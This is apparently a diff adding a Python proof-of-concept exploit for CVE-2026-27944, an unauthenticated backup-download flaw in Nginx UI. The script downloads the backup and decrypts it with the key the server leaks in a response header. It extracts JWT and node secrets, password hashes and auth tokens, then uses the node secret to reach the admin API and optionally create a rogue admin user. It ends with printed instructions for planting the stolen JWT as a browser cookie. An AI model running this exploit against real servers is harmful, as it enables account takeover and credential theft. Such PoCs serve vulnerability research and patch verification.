@@ -1,0 +1,298 @@
+#!/usr/bin/env python3
+"""
+CVE-2026-27944 - Nginx UI Unauthenticated Backup Download with Encryption Key Disclosure
+
+This PoC demonstrates the full exploitation chain:
+1. Download encrypted backup without authentication
+2. Extract AES-256 key and IV from the X-Backup-Security response header
+3. Decrypt the backup archive
+4. Extract Node Secret from app.ini
+5. Use X-Node-Secret header to access admin API
+6. Modify admin password and login to obtain a JWT token for browser access
+"""
+
+import argparse
+import base64
+import configparser
+import hashlib
+import io
+import json
+import os
+import secrets
+import sqlite3
+import string
+import struct
+import sys
+import tempfile
+import time
+import urllib.request
+import zipfile
+from pathlib import Path
+
+try:
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
+    from cryptography.hazmat.primitives import serialization
+except ImportError:
+    print("Please install cryptography: pip install cryptography")
+    sys.exit(1)
+
+
+def aes_cbc_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
+    """Decrypt AES-256-CBC data with PKCS7 unpadding."""
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+    decryptor = cipher.decryptor()
+    decrypted = decryptor.update(data) + decryptor.finalize()
+    pad_len = decrypted[-1]
+    return decrypted[:-pad_len]
+
+
+def download_backup(target: str) -> tuple[bytes, str]:
+    """Download backup and return (zip_data, security_header)."""
+    url = f"{target}/api/backup"
+    print(f"[*] Requesting backup from {url}")
+    req = urllib.request.Request(url)
+    resp = urllib.request.urlopen(req, timeout=15)
+    security = resp.headers.get("X-Backup-Security", "")
+    data = resp.read()
+    print(f"[+] Downloaded backup: {len(data)} bytes")
+    print(f"[+] X-Backup-Security: {security}")
+    return data, security
+
+
+def parse_security_header(header: str) -> tuple[bytes, bytes]:
+    """Parse X-Backup-Security header into (key, iv) bytes."""
+    key_b64, iv_b64 = header.split(":")
+    key = base64.b64decode(key_b64)
+    iv = base64.b64decode(iv_b64)
+    print(f"[+] AES Key ({len(key)*8}-bit): {key.hex()}")
+    print(f"[+] AES IV  ({len(iv)*8}-bit): {iv.hex()}")
+    return key, iv
+
+
+def decrypt_backup(zip_data: bytes, key: bytes, iv: bytes) -> dict[str, bytes]:
+    """Decrypt all files in the backup ZIP archive."""
+    result = {}
+    with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
+        for name in zf.namelist():
+            encrypted = zf.read(name)
+            try:
+                decrypted = aes_cbc_decrypt(encrypted, key, iv)
+                result[name] = decrypted
+                print(f"[+] Decrypted: {name} ({len(decrypted)} bytes)")
+            except Exception as e:
+                print(f"[-] Failed to decrypt {name}: {e}")
+    return result
+
+
+def extract_secrets(decrypted_files: dict[str, bytes], output_dir: str) -> dict:
+    """Extract secrets from decrypted nginx-ui.zip."""
+    secrets = {}
+
+    if "nginx-ui.zip" not in decrypted_files:
+        print("[-] nginx-ui.zip not found in backup")
+        return secrets
+
+    with zipfile.ZipFile(io.BytesIO(decrypted_files["nginx-ui.zip"])) as zf:
+        # Extract app.ini
+        if "app.ini" in zf.namelist():
+            ini_data = zf.read("app.ini").decode()
+            ini_path = os.path.join(output_dir, "app.ini")
+            Path(ini_path).write_text(ini_data)
+
+            config = configparser.ConfigParser()
+            config.read_string(ini_data)
+
+            secrets["jwt_secret"] = config.get("app", "JwtSecret", fallback="")
+            secrets["node_secret"] = config.get("node", "Secret", fallback="")
+            secrets["crypto_secret"] = config.get("crypto", "Secret", fallback="")
+
+            print(f"\n[+] === Extracted Secrets from app.ini ===")
+            print(f"    JwtSecret:    {secrets['jwt_secret']}")
+            print(f"    Node Secret:  {secrets['node_secret']}")
+            print(f"    Crypto Secret: {secrets['crypto_secret']}")
+
+        # Extract database
+        if "database.db" in zf.namelist():
+            db_data = zf.read("database.db")
+            db_path = os.path.join(output_dir, "database.db")
+            Path(db_path).write_bytes(db_data)
+
+            conn = sqlite3.connect(db_path)
+            cursor = conn.cursor()
+
+            print(f"\n[+] === Users from database ===")
+            try:
+                for row in cursor.execute("SELECT id, name, password FROM users"):
+                    print(f"    ID={row[0]}  Name={row[1]}  Password={row[2]}")
+                    secrets.setdefault("users", []).append({
+                        "id": row[0], "name": row[1], "password_hash": row[2]
+                    })
+            except sqlite3.OperationalError:
+                print("    (no users table found)")
+
+            print(f"\n[+] === Active Auth Tokens ===")
+            try:
+                tokens = list(cursor.execute(
+                    "SELECT user_id, token, short_token, expired_at FROM auth_tokens"
+                ))
+                if tokens:
+                    for row in tokens:
+                        print(f"    UserID={row[0]}  Token={row[1][:40]}...  Expires={row[3]}")
+                        secrets.setdefault("tokens", []).append({
+                            "user_id": row[0], "token": row[1],
+                            "short_token": row[2], "expired_at": row[3]
+                        })
+                else:
+                    print("    (no active tokens)")
+            except sqlite3.OperationalError:
+                print("    (no auth_tokens table found)")
+
+            conn.close()
+
+    return secrets
+
+
+def exploit_node_secret(target: str, node_secret: str):
+    """Use X-Node-Secret to access admin API."""
+    print(f"\n[*] === Exploiting with X-Node-Secret ===")
+
+    url = f"{target}/api/users"
+    req = urllib.request.Request(url, headers={"X-Node-Secret": node_secret})
+    try:
+        resp = urllib.request.urlopen(req, timeout=10)
+        data = json.loads(resp.read())
+        print(f"[+] Admin API access successful!")
+        print(f"[+] Response from {url}:")
+        print(json.dumps(data, indent=2))
+        return True
+    except urllib.error.HTTPError as e:
+        print(f"[-] Failed: HTTP {e.code} - {e.read().decode()}")
+        return False
+
+
+def obtain_admin_token(target: str, node_secret: str, username: str = "hacker") -> str:
+    """Create a new admin user via X-Node-Secret, then login to obtain JWT token."""
+    print(f"\n[*] === Obtaining Admin JWT Token ===")
+
+    password = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
+
+    # Step 1: Create a new admin user via X-Node-Secret
+    print(f"[*] Creating new admin user '{username}' via X-Node-Secret...")
+    body = json.dumps({"name": username, "password": password}).encode()
+    req = urllib.request.Request(
+        f"{target}/api/users", data=body, method="POST",
+        headers={"Content-Type": "application/json", "X-Node-Secret": node_secret},
+    )
+    try:
+        resp = urllib.request.urlopen(req, timeout=10)
+        user_data = json.loads(resp.read())
+        print(f"[+] User '{username}' created (ID={user_data['id']}), password: {password}")
+    except urllib.error.HTTPError as e:
+        print(f"[-] Failed to create user: HTTP {e.code} - {e.read().decode()}")
+        return ""
+
+    # Step 2: Get RSA public key for encrypted login
+    print(f"[*] Fetching RSA public key...")
+    body = json.dumps({
+        "timestamp": int(time.time()),
+        "fingerprint": hashlib.sha256(b"poc").hexdigest(),
+    }).encode()
+    req = urllib.request.Request(
+        f"{target}/api/crypto/public_key", data=body,
+        headers={"Content-Type": "application/json"},
+    )
+    try:
+        resp = urllib.request.urlopen(req, timeout=10)
+        result = json.loads(resp.read())
+        pub_key = serialization.load_pem_public_key(result["public_key"].encode())
+        nonce = result.get("nonce", "")
+    except Exception as e:
+        print(f"[-] Failed to get public key: {e}")
+        return ""
+
+    # Step 3: RSA-encrypt login credentials and authenticate
+    print(f"[*] Logging in as '{username}'...")
+    params = json.dumps({"name": username, "password": password, "nonce": nonce}).encode()
+    encrypted = pub_key.encrypt(params, asym_padding.PKCS1v15())
+    body = json.dumps({"encrypted_params": base64.b64encode(encrypted).decode()}).encode()
+    req = urllib.request.Request(
+        f"{target}/api/login", data=body,
+        headers={"Content-Type": "application/json"},
+    )
+    try:
+        resp = urllib.request.urlopen(req, timeout=10)
+        data = json.loads(resp.read())
+        token = data["token"]
+        print(f"[+] Login successful! JWT token obtained.")
+        return token
+    except urllib.error.HTTPError as e:
+        print(f"[-] Login failed: HTTP {e.code} - {e.read().decode()}")
+        return ""
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="CVE-2026-27944 - Nginx UI Unauthenticated Backup Exploit"
+    )
+    parser.add_argument("-u", "--url", required=True,
+                        help="Target URL (e.g. http://localhost:9000)")
+    parser.add_argument("-o", "--output", default=None,
+                        help="Output directory for decrypted files (default: temp dir)")
+    parser.add_argument("--create-user", metavar="USERNAME", default=None,
+                        help="Create a new admin user and obtain JWT token for browser access")
+    args = parser.parse_args()
+
+    target = args.url.rstrip("/")
+    output_dir = args.output or tempfile.mkdtemp(prefix="nginx-ui-backup-")
+    os.makedirs(output_dir, exist_ok=True)
+
+    print(f"[*] Target: {target}")
+    print(f"[*] Output: {output_dir}\n")
+
+    # Step 1: Download backup
+    zip_data, security_header = download_backup(target)
+    if not security_header:
+        print("[-] No X-Backup-Security header found. Target may be patched.")
+        sys.exit(1)
+
+    # Save raw backup
+    backup_path = os.path.join(output_dir, "backup.zip")
+    Path(backup_path).write_bytes(zip_data)
+
+    # Step 2: Parse encryption key
+    key, iv = parse_security_header(security_header)
+
+    # Step 3: Decrypt backup
+    decrypted_files = decrypt_backup(zip_data, key, iv)
+
+    # Step 4: Extract secrets
+    secrets = extract_secrets(decrypted_files, output_dir)
+
+    # Step 5: Exploit with Node Secret
+    node_secret = secrets.get("node_secret", "")
+    if node_secret:
+        exploit_node_secret(target, node_secret)
+    else:
+        print("\n[-] No Node Secret found, cannot exploit further")
+
+    # Step 6: Optionally create new admin user and obtain JWT token
+    token = ""
+    if node_secret and args.create_user:
+        token = obtain_admin_token(target, node_secret, args.create_user)
+
+    # Summary
+    print(f"\n{'='*60}")
+    print(f"[+] Exploitation complete!")
+    print(f"[+] Decrypted files saved to: {output_dir}")
+    if node_secret:
+        print(f"[+] Admin API: curl -H 'X-Node-Secret: {node_secret}' {target}/api/users")
+    if token:
+        print(f"[+] JWT Token: {token}")
+        print(f"[+] Browser access: paste the following in browser console (F12):")
+        print(f'    document.cookie="token={token};path=/"')
+        print(f"    Then refresh the page to enter admin panel.")
+
+
+if __name__ == "__main__":
+    main()
